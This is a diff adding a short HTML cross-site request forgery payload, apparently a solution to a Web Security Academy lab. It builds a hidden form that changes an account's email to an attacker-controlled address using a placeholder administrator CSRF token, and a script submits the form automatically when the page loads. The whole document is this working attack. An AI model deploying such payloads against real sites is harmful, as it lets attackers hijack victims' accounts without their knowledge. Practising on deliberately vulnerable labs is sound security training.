@@ -1,0 +1,8 @@
+<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="attacker@example.com">
+    <input type="hidden" name="csrf" value="ADMINISTRATOR-CSRF-TOKEN">
+</form>
+
+<script>
+    document.forms[0].submit();
+</script>
